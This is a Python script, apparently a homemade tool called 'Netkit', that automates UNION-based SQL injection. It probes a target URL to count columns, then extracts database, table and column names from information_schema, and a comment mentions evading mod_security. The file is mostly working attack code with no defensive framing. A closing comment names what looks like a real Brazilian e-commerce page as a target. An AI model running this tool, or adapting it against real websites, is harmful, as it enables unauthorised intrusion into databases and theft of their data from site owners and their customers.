#!/bin/python3

import requests
from subprocess import check_output as out, call
from sys import argv, exit
from time import sleep
from time import time

ini = time()
print()
def sqli(pull_type: str, diretory: str, extra: str=""):
    # puxar infos
    infos = ['']
    new = []
    for i in range(n):
        algr = []
        for j in range(n):
            algr.append(f"CONCAT(UPPER('x{i}tikten0x'), {pull_type}, UPPER('x0tikten{i}x'))")
        algr = ",".join(algr)
        for j in infos:
            new.append(f"{pull_type} != '{j}'")
        new = " AND ".join(new)
        r = requests.get(f"{argv[1]} union all select {algr} from {diretory} where {new} {extra} --")
        r = r.text
        try:
            co = r.index(f"X{i}TIKTEN0X")+len(f"X{i}TIKTEN0X")
            fi = r.index(f"X0TIKTEN{i}X")
        except:
            break
        infos.append(r[co:fi])
        new = []
    infos = "\n".join(set(infos))
    if infos.replace(" ", "") == "":
        infos = "\n\033[01;91m[+]\033[0;0m\033[01;39mNot Results.\033[0;0m"
    return infos

def pull_columns():
    global n
    print("\033[01;32m[+]\033[0;0m\033[01;39mStarting\033[0;0m")
    print("\033[01;32m[+]\033[0;0m\033[01;39mTesting Connection\033[0;0m")

    try:
        r = requests.get(argv[1])
    except requests.exceptions.ConnectionError:
        print("\033[01;91m[+]\033[0;0m\033[01;39mConnection not ok\033[0;0m")
        exit()
    except requests.exceptions.MissingSchema:
        print("\033[01;91m[+]\033[0;0m\033[01;39mInvalid url\033[0;0m")
        exit()

    print("\033[01;32m[+]\033[0;0m\033[01;39mConnection ok\033[0;0m")
    r = ""
    n = 1
    while not "warning: mysql" in r.lower() and not "Unknown column" in r:
        try:
            r = requests.get(f"{argv[1]} order by {n} --").text
            # tirar mod_security
            #generated by Mod_Security
        except KeyboardInterrupt:
            exit()
        except:
            None
        sleep(0.01)
        n += 1
    n -= 2
    print(f"\033[01;32m[+]\033[0;0m\033[01;39m{n} columns\033[0;0m")

def pullt(require, info):
    if not info in argv:
        print(f"Netkit: {require} requires {info}.")
        exit()
    try:
        type = argv.index(info)+1
        type = argv[type]
    except:
        print("Netkit: missing arguments. Type -h to see the list of commands. ")
        exit()

    if "--dbs" in argv:
        print("Netkit: Args invalids")
        exit()
    return type

if "--tables" in argv:
    if "--columns" in argv:
        print("Netkit: Args invalids")
        exit()
    db = pullt("--tables", "-D")
    if db == "--tables":
        print("Netkit: -D requires name of database.")
        exit()
    pull_columns()
    res = sqli("table_name", "information_schema.tables", f"and table_schema = '{db}'")
    print(res)

elif "--columns" in argv:
    if "--tables" in argv:
        print("Netkit: Args invalids")
        exit()
    db = pullt("--columns", "-D")
    table = pullt("--columns", "-T")
    pull_columns()
    res = sqli("column_name", "information_schema.columns", f"and table_schema = '{db}' and table_name = '{table}'")
    print(res)

elif "--dbs" in argv:
    pull_columns()
    res = sqli("table_schema", "information_schema.tables")
    print(res)
ini = time() - ini
print(f"\nTime: {ini}")

#http://adessocasa.com.br/site/1.5/pag_produtos_loja.php?id=18&&idfornecedor=1
